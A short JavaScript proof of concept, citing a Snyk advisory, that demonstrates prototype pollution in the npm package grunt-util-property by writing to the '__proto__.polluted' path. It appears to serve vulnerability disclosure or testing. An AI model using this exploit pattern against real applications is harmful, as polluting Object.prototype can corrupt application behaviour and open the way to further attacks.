//https://snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088
 
  const grunt = require("grunt");
  const a = require("grunt-util-property");

   

  let b = a(grunt);
  b.call({}, "__proto__.polluted", "yes");
// End of file
